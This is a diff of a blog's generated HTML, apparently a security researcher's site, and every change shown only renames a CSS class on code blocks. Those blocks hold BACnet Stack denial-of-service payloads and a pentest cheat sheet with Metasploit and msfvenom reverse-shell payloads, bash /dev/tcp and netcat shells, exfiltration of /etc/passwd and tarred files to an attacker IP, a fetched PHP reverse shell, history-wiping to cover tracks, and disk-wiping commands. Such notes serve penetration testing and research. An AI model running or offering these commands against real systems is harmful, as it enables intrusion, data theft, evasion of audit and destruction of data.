-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Linux 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Linux 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
 Signal si_signo: 11 Signal si_addr: 18446744073168944418
 Nearby code:
    0x000000000041374e &amp;lt;+19&amp;gt;:    mov    rdx,rbx
@@ -1054,7 +1322,7 @@ No symbol table info available.
 
 &lt;p&gt;Stack and GDB output for segmentation fault in the Atomic Write File service:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Linux 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Linux 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
 Signal si_signo: 11 Signal si_addr: 18446744072714559995
 Nearby code:
    0x000000000041374e &amp;lt;+19&amp;gt;:    mov    rdx,rbx
@@ -1148,15 +1416,15 @@ No symbol table info available.
 &lt;h2 id=&quot;bash&quot;&gt;Bash&lt;/h2&gt;
 
 &lt;p&gt;Device Communication Control payload:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne '\x81\x0a\x00\x16\x01\x04\x00\x05\x01\x11\x0d\xff\x80\x00\x03\x1a\x0a\x19\x00\x2a\x00\x41' | nc -u 192.168.10.10 47808
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne '\x81\x0a\x00\x16\x01\x04\x00\x05\x01\x11\x0d\xff\x80\x00\x03\x1a\x0a\x19\x00\x2a\x00\x41' | nc -u 192.168.10.10 47808
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Atomic Read File service payload:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne '\x81\x0a\x00\x1b\x01\x14\x00\x05\x01\x06\xc4\x02\x80\x00\x00\x0e\x35\xff\xdf\x62\xee\x00\x00\x22\x05\x84\x0f' | nc -u 192.168.10.10 47808
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne '\x81\x0a\x00\x1b\x01\x14\x00\x05\x01\x06\xc4\x02\x80\x00\x00\x0e\x35\xff\xdf\x62\xee\x00\x00\x22\x05\x84\x0f' | nc -u 192.168.10.10 47808
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Atomic Write File service payload:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne '\x81\x0a\x00\x1b\x01\x04\x00\x05\x02\x07\xc4\x02\x80\x00\x00\x0e\x35\xff\x5e\xd5\xc0\x85\x0a\x62\x64\x0a\x0f' | nc -u 192.168.10.10 47808
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne '\x81\x0a\x00\x1b\x01\x04\x00\x05\x02\x07\xc4\x02\x80\x00\x00\x0e\x35\xff\x5e\xd5\xc0\x85\x0a\x62\x64\x0a\x0f' | nc -u 192.168.10.10 47808
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;python&quot;&gt;Python&lt;/h2&gt;
@@ -1165,7 +1433,7 @@ No symbol table info available.
 
 &lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47148&quot;&gt;https://www.exploit-db.com/exploits/47148&lt;/a&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Exploit Title: BACnet Stack 0.8.6 - Denial of Service
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Exploit Title: BACnet Stack 0.8.6 - Denial of Service
 # Exploit Author: mmorillo
 # Vendor Homepage: https://sourceforge.net/p/bacnet/
 # Software Link: https://sourceforge.net/projects/bacnet/files/bacnet-stack/bacnet-stack-0.8.6/
@@ -1300,7 +1568,7 @@ if __name__ == '__main__':
 
 &lt;p&gt;Using the partially implemented &lt;a href=&quot;https://github.com/desolat/scapy-bacnet&quot;&gt;BACnet layer for Scapy&lt;/a&gt; can be generated the BLVC, NPDU and APDU layers in order to send the specific exploit octets. For example:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python
 Python 2.7.16 (default, Apr  1 2019, 14:50:41)
 [GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.3)] on darwin
 Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
@@ -1364,7 +1632,7 @@ Sent 1 packets.
 
 &lt;h2 id=&quot;segmentation-fault&quot;&gt;Segmentation Fault&lt;/h2&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./bacserv
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./bacserv
 BACnet Server Demo
 BACnet Stack Version 0.8.6
 BACnet Device ID: 260001
@@ -1408,7 +1676,7 @@ Violación de segmento (`core' generado)
 
 &lt;p&gt;It is very easy to install and start to use:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git clone https://github.com/DefectDojo/django-DefectDojo
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git clone https://github.com/DefectDojo/django-DefectDojo
 $ cd django-DefectDojo
 $ ./setup.bash
 $ ./run_dojo.bash
@@ -1426,7 +1694,7 @@ $ ./run_dojo.bash
 
 &lt;p&gt;In the next def is sent the data as HTTP GET or HTTP POST depending on the operation needed to be executed:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def fetch_data(DefectDojoURL, headersapi, dataApi, upload):
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def fetch_data(DefectDojoURL, headersapi, dataApi, upload):
 
     if dataApi or upload:
         r = requests.post(DefectDojoURL, headers = headersapi, data = dataApi, verify=False)
@@ -1451,7 +1719,7 @@ $ ./run_dojo.bash
 
 &lt;p&gt;The next def is an example in which can be retrieved all the products in our DefectDojo:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def GetProducts(DefectDojoURL, apiKey):
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def GetProducts(DefectDojoURL, apiKey):
 
     url = DefectDojoURL + &quot;/api/v2/products/&quot;
     dataApi = None
@@ -1474,7 +1742,7 @@ $ ./run_dojo.bash
 
 &lt;p&gt;The next def is an example in which can be upladed report scans for the tools integrated in DefectDojo:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def UploadScan(DefectDojoURL, apiKey, engegementID, PathFile, scan_type, scan_date):
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def UploadScan(DefectDojoURL, apiKey, engegementID, PathFile, scan_type, scan_date):
 
     url = DefectDojoURL + &quot;/api/v2/import-scan/&quot;
 
@@ -1524,7 +1792,7 @@ $ ./run_dojo.bash
 
 &lt;p&gt;From my point of view this is an issue because this functionality is provided under the web application and not by an external API isolated service (is just one HTTP POST call), so is somebody is able to get my token could play every day reseting machines with something as simple as this HTTP POST:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -i -s -k -X $'POST' $'https://www.hackthebox.eu/api/vm/reset/133?api_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -i -s -k -X $'POST' $'https://www.hackthebox.eu/api/vm/reset/133?api_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;This is just my thoughts about APIs, called WebAPIs, and the authentication applied to this type of HTTP services, should have more authentication mechanism? In my opinion yes, not just a token string, like other user identification id, expiry date, session expiration, operation id, link the token with the user cookie or session, etc.&lt;/p&gt;
@@ -1671,7 +1939,7 @@ $ ./run_dojo.bash
 
 &lt;p&gt;&lt;strong&gt;DNS&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;﻿nslookup -type=any &amp;lt;DOMAIN&amp;gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;﻿nslookup -type=any &amp;lt;DOMAIN&amp;gt;
 host -t axfr -l &amp;lt;DOMAIN&amp;gt; &amp;lt;DNSSERVER&amp;gt;
 dig -t mx &amp;lt;DOMAIN&amp;gt;
 dig -t any &amp;lt;DOMAIN&amp;gt;
@@ -1679,7 +1947,7 @@ dig -t any &amp;lt;DOMAIN&amp;gt;
 
 &lt;p&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Service discovery
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Service discovery
 nmap -sV &amp;lt;IP&amp;gt;
 nmap -sV -O &amp;lt;IP&amp;gt;
 nmap -p 1-65535 -T4 -A -v -Pn &amp;lt;IP&amp;gt;
@@ -1749,12 +2017,12 @@ nmap -oN &amp;lt;FILE&amp;gt; &amp;lt;IP&amp;gt;
 
 &lt;p&gt;&lt;strong&gt;MyIP&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget -qO- http://ipecho.net/plain; echo
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget -qO- http://ipecho.net/plain; echo
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;SMB&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient -L &amp;lt;IP&amp;gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient -L &amp;lt;IP&amp;gt;
 rpcclient -U &quot;&quot; &amp;lt;IP&amp;gt;
 smbclient -U &amp;lt;HOST&amp;gt; -L &amp;lt;IP&amp;gt;
 /usr/bin/smbclient \\\\&amp;lt;IP&amp;gt;\\share &amp;lt;HOST&amp;gt;
@@ -1766,7 +2034,7 @@ smbclient -U &amp;lt;HOST&amp;gt; -L &amp;lt;IP&amp;gt;
 
 &lt;p&gt;&lt;strong&gt;Search Exploits&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nikto -h &amp;lt;http://IP&amp;gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nikto -h &amp;lt;http://IP&amp;gt;
 searchsploit
 sudo wpscan --url &amp;lt;IP&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -1779,7 +2047,7 @@ sudo wpscan --url &amp;lt;IP&amp;gt;
   &lt;li&gt;Windows&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use exploit/multi/handler 
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use exploit/multi/handler 
 msf exploit(handler) &amp;gt; set payload windows/meterpreter/reverse_tcp
 payload =&amp;gt; windows/meterpreter/reverse_tcp 
 msf exploit(handler) &amp;gt; set LHOST &amp;lt;IP&amp;gt; 
@@ -1793,7 +2061,7 @@ msf exploit(handler) &amp;gt; run
   &lt;li&gt;Linux&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf payload(linux/x86/meterpreter/reverse_tcp) &amp;gt; use exploit/multi/handler 
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf payload(linux/x86/meterpreter/reverse_tcp) &amp;gt; use exploit/multi/handler 
 msf exploit(multi/handler) &amp;gt; set payload linux/x86/meterpreter/reverse_tcp 
 payload =&amp;gt; linux/x86/meterpreter/reverse_tcp
 msf exploit(multi/handler) &amp;gt; set LHOST &amp;lt;IP&amp;gt;
@@ -1803,7 +2071,7 @@ msf exploit(multi/handler) &amp;gt; run
 
 &lt;p&gt;&lt;strong&gt;msfvenom&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=4444 -f war &amp;gt; shell.war
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=4444 -f elf &amp;gt; shell.elf
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -1822,17 +2090,17 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=444
 &lt;h3 id=&quot;reverse-shells&quot;&gt;Reverse Shells&lt;/h3&gt;
 
 &lt;p&gt;&lt;strong&gt;Upgrade shell&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;);'
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;);'
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;Listener&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvp 4444
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvp 4444
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;Target&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Bash
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Bash
 bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;IP&amp;gt;/4444 0&amp;gt;&amp;amp;1
 
 # Perl
@@ -1861,7 +2129,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:&amp;lt;IP&amp;gt;:4444
 &lt;h3 id=&quot;bind-shell&quot;&gt;Bind Shell&lt;/h3&gt;
 
 &lt;p&gt;&lt;strong&gt;Target&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Windows
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Windows
 nc -lvp 4444 -e cmd.exe
 
 # Linux
@@ -1869,34 +2137,34 @@ nc -lvp 4444 -e /bin/sh
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &amp;lt;IP&amp;gt; 4444
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &amp;lt;IP&amp;gt; 4444
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;sending-files&quot;&gt;Sending files&lt;/h3&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exec 3&amp;lt;&amp;gt;/dev/tcp/&amp;lt;IP&amp;gt;/4444 &amp;amp;&amp;amp; cat /etc/passwd&amp;gt;&amp;amp;3
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exec 3&amp;lt;&amp;gt;/dev/tcp/&amp;lt;IP&amp;gt;/4444 &amp;amp;&amp;amp; cat /etc/passwd&amp;gt;&amp;amp;3
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;With Netcat&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;Listener:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat -l 4444 &amp;gt; received_file
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat -l 4444 &amp;gt; received_file
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Target:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat &amp;lt;IP&amp;gt; 4444 &amp;lt; original_file
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat &amp;lt;IP&amp;gt; 4444 &amp;lt; original_file
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Listener:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat -l 4444 | tar xzvf -
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netcat -l 4444 | tar xzvf -
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Target:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tar -czf - * | netcat &amp;lt;IP&amp;gt; 4444
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tar -czf - * | netcat &amp;lt;IP&amp;gt; 4444
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;file-upload-in-windows-with-powershell&quot;&gt;File upload in Windows with PowerShell&lt;/h3&gt;
@@ -1907,7 +2175,7 @@ nc -lvp 4444 -e /bin/sh
 
 &lt;p&gt;&lt;a href=&quot;https://github.com/JohnTroony/php-webshells&quot;&gt;php-webshells&lt;/a&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget -O /tmp/php_shell.php https://raw.githubusercontent.com/JohnTroony/php-webshells/master/php-reverse-shell.php &amp;amp;&amp;amp; php -f /tmp/php_shell.php
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget -O /tmp/php_shell.php https://raw.githubusercontent.com/JohnTroony/php-webshells/master/php-reverse-shell.php &amp;amp;&amp;amp; php -f /tmp/php_shell.php
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;php-reverse-shell&lt;/a&gt;&lt;/p&gt;
@@ -1918,14 +2186,14 @@ nc -lvp 4444 -e /bin/sh
 
 &lt;p&gt;&lt;strong&gt;Avoiding history&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export HISTFILE=
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export HISTFILE=
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unset HISTFILE
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unset HISTFILE
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;Clear history&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -rf .bash_history 
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -rf .bash_history 
 touch .bash_history (invasive)
 history -c
 set +o history
@@ -1933,7 +2201,7 @@ set +o history
 
 &lt;p&gt;&lt;strong&gt;Destroy&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -rf / 
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -rf / 
 find / -type f -exec {} 
 mkfs.ext3 /dev/sda
 dd if=/dev/zero of=/dev/sda bs=1M
@@ -1971,7 +2239,7 @@ dd if=/dev/zero of=/dev/sda bs=1M
 
 &lt;p&gt;Using python libraries.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP_HOST
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP_HOST
 HTTP_USER_AGENT
 HTTP_ACCEPT
 HTTP_ACCEPT_LANGUAGE
@@ -1990,7 +2258,7 @@ SERVER
 
 &lt;p&gt;Using services provided by &lt;a href=&quot;http://freegeoip.net/json/&quot;&gt;freegeoip&lt;/a&gt; or &lt;a href=&quot;https://www.maxmind.com/es/home&quot;&gt;maxmind&lt;/a&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;location_city
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;location_city
 location_state
 location_country
 latitude
@@ -2001,7 +2269,7 @@ longitude
 
 &lt;p&gt;Using &lt;a href=&quot;https://github.com/Valve/fingerprintjs2&quot;&gt;Fingerprintjs2&lt;/a&gt;&lt;/p&gt;
 
